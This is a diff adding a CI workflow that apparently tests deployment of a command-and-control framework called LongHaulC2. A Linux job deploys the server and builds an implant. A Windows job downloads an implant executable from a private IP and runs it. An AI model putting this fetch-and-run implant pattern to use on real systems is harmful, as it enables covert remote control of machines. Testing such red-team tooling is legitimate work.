@@ -1,0 +1,50 @@
+name: Deployment Test - Ubuntu 22.04, 24.04, Python 3.10, 3.11, 3.12
+
+# for testing deployment
+
+on:
+  push:
+    #branches: [ "main" ] # commented out to test pushes
+  pull_request:
+    branches: [ "main" ]
+
+jobs:
+
+# server setup
+  server-deployment:
+    runs-on: "gh_runner_ubuntu"
+    
+    steps:
+    - name: Check out the code
+      uses: actions/checkout@v4
+
+
+    - name: Deploy
+      run: |
+        # Testing out deployment
+        sudo -E make deploy
+        echo "Successfully deployed LongHaulC2"
+
+    - name: Setup
+      run: |
+        # setup listeners, build implant
+        # pyfile me with api script
+        pytest tests/full_scope/setup_implant.py::test_setup_implant
+
+    # - name: Test Implant
+    #   run: |
+    #     # Feed commands to implant. Assert for fast fail so this fails out
+    #     # pyfile me with api script
+
+
+  implant-deployment:
+    runs-on: "GH_RUNNER_WIN"
+    
+    steps:
+    - name: Get & Run Implant
+      run: |
+        # Pull implant
+        Invoke-WebRequest http://10.0.1.170:8000/pytest_implant.exe -OutFile c:\pytest_implant.exe
+        # run implant
+        C:\pytest_implant.exe
+
